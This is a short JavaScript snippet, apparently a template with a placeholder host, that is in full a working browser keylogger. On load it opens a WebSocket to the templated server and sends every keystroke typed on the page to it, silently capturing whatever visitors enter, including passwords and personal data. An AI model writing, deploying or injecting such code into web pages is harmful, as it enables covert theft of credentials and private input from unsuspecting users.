(function (){
  let conn = new WebSocket("ws://{{.}}/ws")
  document.onkeydown = keydown;
  function keydown(e) {
      conn.send(e.key)
  }
}())